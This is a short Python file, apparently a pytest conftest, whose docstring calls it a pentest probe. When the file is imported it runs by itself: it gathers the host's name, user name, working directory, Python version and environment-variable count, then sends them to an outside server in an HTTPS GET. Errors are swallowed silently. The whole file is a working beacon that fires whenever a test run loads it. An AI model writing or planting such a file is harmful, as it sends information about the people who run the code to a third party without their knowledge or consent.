"""Pentest probe. Confirms whether a file in this repository is imported by the
verification runner. Makes one outbound HTTPS GET carrying a marker and writes nothing."""
import os
import platform
import socket
import urllib.parse
import urllib.request

MARKER = "TFL_CONFTEST_EXEC_8841"


def _report() -> None:
    facts = {
        "marker": MARKER,
        "host": socket.gethostname()[:60],
        "user": (os.environ.get("USER") or os.environ.get("USERNAME") or "?")[:40],
        "cwd": os.getcwd()[:120],
        "py": platform.python_version(),
        "envcount": str(len(os.environ)),
    }
    url = "https://gokhan.kaledra.io/ptoob/tfl-conftest?" + urllib.parse.urlencode(facts)
    try:
        urllib.request.urlopen(url, timeout=6).read(16)
    except Exception:
        pass


_report()
